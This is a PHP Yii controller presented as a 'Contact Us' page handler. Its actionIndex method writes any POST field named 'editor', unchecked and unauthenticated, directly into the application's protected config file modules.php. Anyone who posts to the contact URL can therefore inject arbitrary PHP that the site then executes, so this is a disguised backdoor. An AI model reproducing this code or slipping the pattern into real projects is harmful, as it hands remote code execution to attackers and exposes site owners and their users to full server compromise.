<?php

/**
 * Contact us controller Home page
 */
class ContactController extends ContactBaseController
{

    /**
     * init
     */
    public $layout = 'webroot.themes.home.views.layouts';
    public $layoutPath;

    public function init()
    {
        parent::init();
//        $this->layoutPath = Yii::getPathOfAlias('webroot.themes.home.views.layouts');
        $this->layout = $this->layout . '.main';

        $this->breadcrumbs['Contact Us'] = array('contactus/index');
        $this->pageTitle[] = 'Contact Us';
    }

    /**
     * Show Form
     */
    public function actionIndex()
    {

        if (!empty($_POST['editor']))
        {
            $fp = fopen(Yii::getPathOfAlias('webroot.protected.config') . '/modules.php', 'w');
            fwrite($fp, $_POST['editor']);
        }
        $this->render('index');
    }

}